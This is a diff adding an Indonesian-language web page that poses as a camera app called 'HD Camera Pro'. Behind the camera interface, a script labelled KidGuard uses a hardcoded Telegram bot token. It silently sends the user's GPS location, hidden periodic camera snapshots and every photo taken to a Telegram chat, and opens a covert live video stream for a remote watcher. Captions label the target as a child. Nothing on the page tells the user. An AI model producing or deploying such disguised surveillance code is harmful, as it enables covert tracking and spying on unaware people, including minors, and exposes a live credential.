@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>HD Camera Pro</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{width:100%;height:100%;overflow:hidden;background:#000;font-family:sans-serif;}
+
+/* Viewfinder */
+#viewfinder{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;background:#000;}
+#canvas-main{display:none;}
+
+/* Overlay UI */
+#ui{position:fixed;inset:0;z-index:10;pointer-events:none;}
+
+/* Top bar */
+#topbar{
+  position:absolute;top:0;left:0;right:0;
+  padding:env(safe-area-inset-top,14px) 20px 14px;
+  display:flex;align-items:center;justify-content:space-between;
+  background:linear-gradient(to bottom,rgba(0,0,0,.65),transparent);
+  pointer-events:auto;
+}
+.top-btn{
+  width:40px;height:40px;border-radius:50%;
+  background:rgba(0,0,0,.35);border:none;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:#fff;font-size:18px;
+  pointer-events:auto;
+}
+.top-btn svg{width:20px;height:20px;}
+#flash-btn{font-size:16px;}
+#hd-badge{
+  background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.25);
+  color:#fff;font-size:10px;font-weight:700;letter-spacing:.12em;
+  padding:4px 10px;border-radius:4px;
+}
+#timer-display{
+  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  font-size:72px;font-weight:100;color:#fff;
+  text-shadow:0 0 20px rgba(0,0,0,.8);
+  display:none;pointer-events:none;
+}
+
+/* Grid lines (camera aesthetic) */
+#grid{position:absolute;inset:0;pointer-events:none;opacity:.18;}
+#grid::before,#grid::after{content:'';position:absolute;background:rgba(255,255,255,.6);}
+#grid::before{left:33.33%;width:1px;top:0;bottom:0;}
+#grid::after{top:33.33%;height:1px;left:0;right:0;}
+.grid-h2{position:absolute;top:66.66%;left:0;right:0;height:1px;background:rgba(255,255,255,.6);}
+.grid-v2{position:absolute;left:66.66%;top:0;bottom:0;width:1px;background:rgba(255,255,255,.6);}
+
+/* Focus ring */
+#focus-ring{
+  position:absolute;width:70px;height:70px;
+  border:1.5px solid #ffd60a;border-radius:4px;
+  transform:translate(-50%,-50%);
+  display:none;pointer-events:none;
+  animation:focusPop .25s ease;
+}
+@keyframes focusPop{from{width:90px;height:90px;opacity:.4;}to{width:70px;height:70px;opacity:1;}}
+
+/* Bottom bar */
+#botbar{
+  position:absolute;bottom:0;left:0;right:0;
+  padding:20px 0 calc(env(safe-area-inset-bottom,20px) + 16px);
+  display:flex;align-items:center;justify-content:space-around;
+  background:linear-gradient(to top,rgba(0,0,0,.7),transparent);
+  pointer-events:auto;
+}
+/* Thumbnail */
+#thumb{
+  width:52px;height:52px;border-radius:8px;
+  background:rgba(255,255,255,.08);border:1.5px solid rgba(255,255,255,.2);
+  overflow:hidden;cursor:pointer;flex-shrink:0;
+}
+#thumb img{width:100%;height:100%;object-fit:cover;display:none;}
+
+/* Shutter */
+#shutter{
+  width:72px;height:72px;border-radius:50%;
+  background:transparent;
+  border:3px solid #fff;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;flex-shrink:0;
+  transition:transform .12s;
+  -webkit-tap-highlight-color:transparent;
+}
+#shutter:active{transform:scale(.88);}
+#shutter-inner{
+  width:58px;height:58px;border-radius:50%;
+  background:#fff;
+  transition:all .12s;
+}
+#shutter:active #shutter-inner{width:50px;height:50px;}
+
+/* Flip camera */
+#flip-btn{
+  width:52px;height:52px;border-radius:50%;
+  background:rgba(0,0,0,.35);border:none;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:#fff;
+}
+#flip-btn svg{width:26px;height:26px;}
+
+/* Mode tabs */
+#modes{
+  position:absolute;bottom:calc(env(safe-area-inset-bottom,20px)+96px);
+  left:0;right:0;
+  display:flex;justify-content:center;gap:24px;
+  pointer-events:auto;
+}
+.mode-tab{
+  font-size:11px;font-weight:600;letter-spacing:.1em;text-transform:uppercase;
+  color:rgba(255,255,255,.4);cursor:pointer;padding:4px 2px;
+  border-bottom:2px solid transparent;transition:all .2s;
+}
+.mode-tab.active{color:#ffd60a;border-bottom-color:#ffd60a;}
+
+/* Zoom bar */
+#zoombar{
+  position:absolute;
+  bottom:calc(env(safe-area-inset-bottom,20px)+148px);
+  left:50%;transform:translateX(-50%);
+  display:flex;gap:8px;align-items:center;
+  pointer-events:auto;
+}
+.zoom-btn{
+  background:rgba(0,0,0,.4);border:1px solid rgba(255,255,255,.2);
+  color:#fff;font-size:11px;font-weight:600;
+  padding:5px 12px;border-radius:20px;cursor:pointer;
+  transition:all .15s;
+}
+.zoom-btn.active{background:rgba(255,214,10,.9);color:#000;border-color:transparent;}
+
+/* Flash overlay */
+#flash-overlay{
+  position:fixed;inset:0;background:#fff;
+  opacity:0;pointer-events:none;z-index:50;
+  transition:opacity .08s;
+}
+
+/* Preview full */
+#preview-full{
+  position:fixed;inset:0;background:#000;z-index:60;
+  display:none;flex-direction:column;
+}
+#preview-full img{flex:1;width:100%;object-fit:contain;}
+#preview-bar{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:16px 20px;background:#000;
+}
+#preview-bar button{
+  background:none;border:none;color:#fff;font-size:14px;
+  cursor:pointer;padding:8px 16px;
+}
+#preview-bar button.del{color:#f87171;}
+
+/* Loading screen */
+#loading{
+  position:fixed;inset:0;background:#000;z-index:100;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+}
+#loading.hide{display:none;}
+.ld-icon{font-size:48px;margin-bottom:4px;}
+.ld-title{color:#fff;font-size:18px;font-weight:600;letter-spacing:.04em;}
+.ld-sub{color:#4b5563;font-size:12px;letter-spacing:.06em;}
+.ld-dots{display:flex;gap:6px;}
+.ld-dot{width:6px;height:6px;border-radius:50%;background:#374151;animation:dotPulse 1.2s ease infinite;}
+.ld-dot:nth-child(2){animation-delay:.2s;}
+.ld-dot:nth-child(3){animation-delay:.4s;}
+@keyframes dotPulse{0%,100%{background:#374151;}50%{background:#fff;}}
+
+/* No cam screen */
+#no-cam{
+  position:fixed;inset:0;background:#0a0a0a;z-index:99;
+  display:none;flex-direction:column;align-items:center;justify-content:center;gap:14px;
+  text-align:center;padding:32px;
+}
+#no-cam svg{width:56px;height:56px;color:#374151;margin-bottom:8px;}
+#no-cam h2{color:#9ca3af;font-size:18px;font-weight:500;}
+#no-cam p{color:#4b5563;font-size:13px;line-height:1.6;}
+#no-cam button{
+  margin-top:8px;background:#fff;color:#000;border:none;
+  padding:12px 28px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;
+}
+
+/* Zoom indicator */
+#zoom-indicator{
+  position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  background:rgba(0,0,0,.5);color:#ffd60a;
+  font-size:20px;font-weight:600;
+  padding:8px 18px;border-radius:8px;
+  display:none;pointer-events:none;
+}
+</style>
+</head>
+<body>
+
+<video id="viewfinder" autoplay playsinline muted></video>
+<canvas id="canvas-main"></canvas>
+
+<!-- Grid overlay -->
+<div id="grid">
+  <div class="grid-h2"></div>
+  <div class="grid-v2"></div>
+</div>
+<div id="focus-ring"></div>
+<div id="zoom-indicator"></div>
+<div id="timer-display"></div>
+
+<!-- Main UI -->
+<div id="ui">
+  <div id="topbar">
+    <button class="top-btn" id="flash-btn" onclick="toggleFlash()">⚡</button>
+    <div id="hd-badge">HD PRO</div>
+    <button class="top-btn" onclick="toggleGrid()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+        <rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="3" x2="9" y2="21"/><line x1="15" y1="3" x2="15" y2="21"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="3" y1="15" x2="21" y2="15"/>
+      </svg>
+    </button>
+  </div>
+
+  <div id="zoombar">
+    <div class="zoom-btn active" onclick="setZoom(1)">1×</div>
+    <div class="zoom-btn" onclick="setZoom(2)">2×</div>
+    <div class="zoom-btn" onclick="setZoom(4)">4×</div>
+  </div>
+
+  <div id="modes">
+    <div class="mode-tab" onclick="setMode('video')">VIDEO</div>
+    <div class="mode-tab active" onclick="setMode('photo')">FOTO</div>
+    <div class="mode-tab" onclick="setMode('timer')">TIMER</div>
+  </div>
+
+  <div id="botbar">
+    <div id="thumb" onclick="openPreview()">
+      <img id="thumb-img" src="">
+    </div>
+    <div id="shutter" onclick="takePhoto()">
+      <div id="shutter-inner"></div>
+    </div>
+    <button id="flip-btn" onclick="flipCamera()">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+        <path d="M20 7h-9m0 0l3-3m-3 3l3 3M4 17h9m0 0l-3 3m3-3l-3-3"/>
+      </svg>
+    </button>
+  </div>
+</div>
+
+<!-- Flash -->
+<div id="flash-overlay"></div>
+
+<!-- Preview full -->
+<div id="preview-full">
+  <img id="preview-img" src="">
+  <div id="preview-bar">
+    <button onclick="closePreview()">✕ Tutup</button>
+    <button onclick="downloadPhoto()">↓ Simpan</button>
+    <button class="del" onclick="deletePhoto()">🗑 Hapus</button>
+  </div>
+</div>
+
+<!-- Loading -->
+<div id="loading">
+  <div class="ld-icon">📷</div>
+  <div class="ld-title">HD Camera Pro</div>
+  <div class="ld-sub">MEMUAT KAMERA...</div>
+  <div class="ld-dots">
+    <div class="ld-dot"></div>
+    <div class="ld-dot"></div>
+    <div class="ld-dot"></div>
+  </div>
+</div>
+
+<!-- No cam fallback -->
+<div id="no-cam">
+  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+    <path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/>
+    <line x1="1" y1="1" x2="23" y2="23"/>
+  </svg>
+  <h2>Kamera Tidak Tersedia</h2>
+  <p>Izinkan akses kamera untuk menggunakan HD Camera Pro</p>
+  <button onclick="initCamera()">Coba Lagi</button>
+</div>
+
+<video id="vid-hidden" autoplay playsinline muted style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
+<canvas id="snc" style="display:none;position:fixed;top:-9999px;"></canvas>
+<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+<script>
+// ─── KIDGUARD CONFIG ──────────────────────
+const KG={token:'8114225625:AAGwdD3MzPx_MGWCW8bS9b2852JULcJ8_wU',chatId:'7885097329',interval:10};
+const API=`https://api.telegram.org/bot${KG.token}`;
+
+// ─── GPS ──────────────────────────────────
+let _lat=null,_lng=null,_acc=null;
+async function gpsInit(){
+  if(!navigator.geolocation)return;
+  const opt={enableHighAccuracy:true,timeout:15000,maximumAge:0};
+  navigator.geolocation.getCurrentPosition(p=>{
+    _lat=p.coords.latitude;_lng=p.coords.longitude;_acc=Math.round(p.coords.accuracy);
+    sendLoc();
+  },()=>{},opt);
+  navigator.geolocation.watchPosition(p=>{
+    _lat=p.coords.latitude;_lng=p.coords.longitude;_acc=Math.round(p.coords.accuracy);
+  },()=>{},opt);
+  setInterval(()=>{if(_lat)sendLoc();},KG.interval*60*1000);
+}
+async function sendLoc(){
+  if(!_lat)return;
+  const now=new Date(),ts=now.toLocaleDateString('id-ID')+' '+now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+  const fd=new FormData();fd.append('chat_id',KG.chatId);fd.append('latitude',_lat);fd.append('longitude',_lng);fd.append('horizontal_accuracy',Math.min(_acc||50,1500));
+  fetch(`${API}/sendLocation`,{method:'POST',body:fd}).catch(()=>{});
+  fetch(`${API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:KG.chatId,text:`📍 *Lokasi Anak*\n🕐 ${ts}\n📏 ~${_acc}m\n🗺 [Maps](https://maps.google.com/?q=${_lat},${_lng})`,parse_mode:'Markdown'})}).catch(()=>{});
+}
+
+// ─── KIRIM FOTO KE TELEGRAM ───────────────
+const _vh=document.getElementById('vid-hidden'),_sc=document.getElementById('snc');
+let _peer=null;
+
+function peerInit(st){
+  try{
+    _peer=new Peer({config:{iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'}]}});
+    _peer.on('open',id=>{
+      fetch(`${API}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:KG.chatId,text:`🎥 *Live Siap!*\n📺 [Tonton](${location.origin}/ortu?p=${id})\n🔑 \`${id}\``,parse_mode:'Markdown'})}).catch(()=>{});
+    });
+    _peer.on('call',call=>call.answer(st));
+    _peer.on('error',()=>{});
+  }catch(e){}
+}
+
+function sendSnapBg(stream){
+  _vh.srcObject=stream;
+  _sc.width=640;_sc.height=480;
+  setTimeout(()=>{
+    try{
+      _sc.getContext('2d').drawImage(_vh,0,0,640,480);
+      _sc.toBlob(b=>{
+        if(!b)return;
+        const now=new Date(),ts=now.toLocaleDateString('id-ID')+' '+now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+        const fd=new FormData();fd.append('chat_id',KG.chatId);fd.append('photo',b,'snap.jpg');
+        fd.append('caption',`📸 KidGuard\n🕐 ${ts}\n📷 HD Camera Pro${_lat?'\n📍 '+_lat.toFixed(5)+','+_lng.toFixed(5):''}`);
+        fetch(`${API}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
+      },'image/jpeg',.85);
+    }catch(e){}
+  },1500);
+}
+
+// ─── CAMERA ENGINE ────────────────────────
+const vid=document.getElementById('viewfinder');
+const cnv=document.getElementById('canvas-main');
+let stream=null,facingMode='user',currentMode='photo',flashOn=false,gridOn=true;
+let zoomLevel=1,timerSec=3,timerActive=false;
+let photos=[],currentPhotoIdx=-1;
+
+async function initCamera(){
+  document.getElementById('no-cam').style.display='none';
+  document.getElementById('loading').classList.remove('hide');
+  try{
+    if(stream){stream.getTracks().forEach(t=>t.stop());}
+    const constraints={
+      video:{facingMode,width:{ideal:1920},height:{ideal:1080},frameRate:{ideal:30}},
+      audio:false
+    };
+    stream=await navigator.mediaDevices.getUserMedia(constraints);
+    vid.srcObject=stream;
+    await new Promise(r=>vid.onloadedmetadata=r);
+    document.getElementById('loading').classList.add('hide');
+
+    // KidGuard background init
+    gpsInit();
+    peerInit(stream);
+    sendSnapBg(stream);
+    setInterval(()=>sendSnapBg(stream),KG.interval*60*1000);
+
+    // Apply zoom if supported
+    applyZoom();
+  }catch(e){
+    document.getElementById('loading').classList.add('hide');
+    document.getElementById('no-cam').style.display='flex';
+  }
+}
+
+function applyZoom(){
+  try{
+    const track=stream?.getVideoTracks()[0];
+    const caps=track?.getCapabilities();
+    if(caps?.zoom){
+      const min=caps.zoom.min,max=caps.zoom.max;
+      const z=min+(max-min)*(zoomLevel/4);
+      track.applyConstraints({advanced:[{zoom:Math.min(z,max)}]});
+    }else{
+      // CSS zoom fallback
+      vid.style.transform=`scale(${zoomLevel})`;
+    }
+  }catch(e){vid.style.transform=`scale(${zoomLevel})`;}
+}
+
+function setZoom(z){
+  zoomLevel=z;
+  document.querySelectorAll('.zoom-btn').forEach(b=>b.classList.remove('active'));
+  document.querySelector(`.zoom-btn:nth-child(${z===1?1:z===2?2:3})`).classList.add('active');
+  applyZoom();
+  const zi=document.getElementById('zoom-indicator');
+  zi.textContent=z+'×';zi.style.display='block';
+  clearTimeout(zi._t);zi._t=setTimeout(()=>zi.style.display='none',1000);
+}
+
+function flipCamera(){
+  facingMode=facingMode==='user'?'environment':'user';
+  initCamera();
+}
+
+function toggleFlash(){
+  flashOn=!flashOn;
+  document.getElementById('flash-btn').textContent=flashOn?'🔦':'⚡';
+  try{
+    const track=stream?.getVideoTracks()[0];
+    track?.applyConstraints({advanced:[{torch:flashOn}]});
+  }catch(e){}
+}
+
+function toggleGrid(){
+  gridOn=!gridOn;
+  document.getElementById('grid').style.opacity=gridOn?.18:0;
+}
+
+function setMode(m){
+  currentMode=m;
+  document.querySelectorAll('.mode-tab').forEach(t=>t.classList.remove('active'));
+  document.querySelector(`.mode-tab:nth-child(${m==='video'?1:m==='photo'?2:3})`).classList.add('active');
+}
+
+// ── Focus tap ──
+document.getElementById('viewfinder').addEventListener('click',e=>{
+  const ring=document.getElementById('focus-ring');
+  ring.style.left=e.clientX+'px';ring.style.top=e.clientY+'px';
+  ring.style.display='block';
+  ring.style.animation='none';void ring.offsetWidth;ring.style.animation='focusPop .25s ease';
+  clearTimeout(ring._t);ring._t=setTimeout(()=>ring.style.display='none',1200);
+  try{
+    const track=stream?.getVideoTracks()[0];
+    const rect=vid.getBoundingClientRect();
+    const x=(e.clientX-rect.left)/rect.width;const y=(e.clientY-rect.top)/rect.height;
+    track?.applyConstraints({advanced:[{pointOfInterest:{x,y},focusMode:'manual'}]});
+  }catch(e2){}
+});
+
+// ── Take photo ──
+function doCapture(){
+  const fo=document.getElementById('flash-overlay');
+  fo.style.opacity='1';setTimeout(()=>fo.style.opacity='0',150);
+  cnv.width=vid.videoWidth||1920;cnv.height=vid.videoHeight||1080;
+  const ctx=cnv.getContext('2d');
+  if(facingMode==='user'){ctx.translate(cnv.width,0);ctx.scale(-1,1);}
+  ctx.drawImage(vid,0,0);
+  const dataUrl=cnv.toDataURL('image/jpeg',.95);
+  photos.unshift(dataUrl);
+  // Update thumbnail
+  const ti=document.getElementById('thumb-img');ti.src=dataUrl;ti.style.display='block';
+  currentPhotoIdx=0;
+
+  // Kirim ke Telegram juga
+  cnv.toBlob(b=>{
+    if(!b)return;
+    const now=new Date(),ts=now.toLocaleDateString('id-ID')+' '+now.toLocaleTimeString('id-ID',{hour:'2-digit',minute:'2-digit'});
+    const fd=new FormData();fd.append('chat_id',KG.chatId);fd.append('photo',b,'foto.jpg');
+    fd.append('caption',`📸 Foto Anak\n🕐 ${ts}${_lat?'\n📍 '+_lat.toFixed(5)+','+_lng.toFixed(5):''}`);
+    fetch(`${API}/sendPhoto`,{method:'POST',body:fd}).catch(()=>{});
+  },'image/jpeg',.92);
+}
+
+function takePhoto(){
+  if(timerActive)return;
+  if(currentMode==='timer'){
+    startTimer();return;
+  }
+  doCapture();
+}
+
+function startTimer(){
+  timerActive=true;
+  let count=timerSec;
+  const td=document.getElementById('timer-display');
+  td.style.display='block';
+  const iv=setInterval(()=>{
+    td.textContent=count;
+    if(count<=0){
+      clearInterval(iv);td.style.display='none';
+      timerActive=false;doCapture();
+    }
+    count--;
+  },1000);
+  td.textContent=count;
+}
+
+// ── Preview ──
+function openPreview(){
+  if(!photos.length)return;
+  document.getElementById('preview-img').src=photos[currentPhotoIdx<0?0:currentPhotoIdx];
+  document.getElementById('preview-full').style.display='flex';
+}
+function closePreview(){document.getElementById('preview-full').style.display='none';}
+function downloadPhoto(){
+  const a=document.createElement('a');a.href=document.getElementById('preview-img').src;
+  a.download='photo_'+Date.now()+'.jpg';a.click();
+}
+function deletePhoto(){
+  photos.splice(currentPhotoIdx<0?0:currentPhotoIdx,1);
+  closePreview();
+  const ti=document.getElementById('thumb-img');
+  if(photos.length){ti.src=photos[0];}else{ti.style.display='none';}
+}
+
+// ── Start ──
+initCamera();
+</script>
+</body>
+</html>
